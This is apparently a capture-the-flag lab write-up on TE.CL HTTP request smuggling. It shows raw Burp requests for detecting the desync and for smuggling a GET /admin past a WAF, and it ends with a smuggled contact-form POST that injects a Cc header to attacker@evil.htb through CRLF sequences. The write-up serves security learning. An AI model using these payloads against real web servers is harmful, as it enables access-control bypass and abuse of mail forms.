**Transfer-Encoding - Content-Lenght Attack**
This attack happens when the front-end(reverse proxy) parses correctly the Transfer-Encoding chunks which will be right size and the back-end(web-server) fails at parsing the chunks as they will be wrong intentionally.

## How to identify?
Send the following payload via Burp, send 2 request simultaneously to make the back-end fail. OBS:  unchecking the Update Content-Length option in Burpsuite and add the request to a group-tab with Send group in sequence (single connection).
```
POST / HTTP/1.1
Host: tecl.htb
Content-Length: 3
Transfer-Encoding: chunked

5
HELLO
0
```
In this case the front-end will parse the TE correctly by separating the first chunk with 5 bytes body, and a second one with **0bytes lenght** denoting the end of the stream. Consequently the back-end which reads only the **CL size is 3bytes** and will interpret as **5\r\n** which is wrong and get the **HELLO** in second hand!


## How to Exploit a WAF?
In this lab there is a WAF that blocks all request having the word "admin" in the URL. OBS: to calculate the right byte size for TE you can use thins one to convert to chunked(https://portswigger.net/bappstore/aaaa60ef945341e8a450217a54a11646)
To bypass you have to add to a tab group 2 requests and send via single connection:
```

Request 1(OBS: It need to finish with 2x /r/n):
GET /404 HTTP/1.1
Host: tecl.htb
Content-Length: 4
Transfer-Encoding: chunked

27
GET /admin HTTP/1.1
Host: tecl.htb


0



Request 2:
GET /404 HTTP/1.1
Host: tecl.htb
```
OBS: The CL need to match the right length of the first hex idex from first chunk(in our case **/r/n27=4bytes**) so the back-end treats that as a first stream, then /admin will come, then /404
It is a good idea to add the `Content-Type: application/x-www-form-urlencoded` header as well in the Smuggled request.
Lastly if is a POST request in the smuggled part you will need the CL as well 
```
**Smuggled request**
POST /contact HTTP/1.1
Host: 83.136.253.251:54607
Content-Length: 101
Content-Type: application/x-www-form-urlencoded

name=hacker%0d%0aCc:%20attacker%40evil.htb%0d%0aDummy:%20test&email=attacker%40evil.htb&message=Hello
```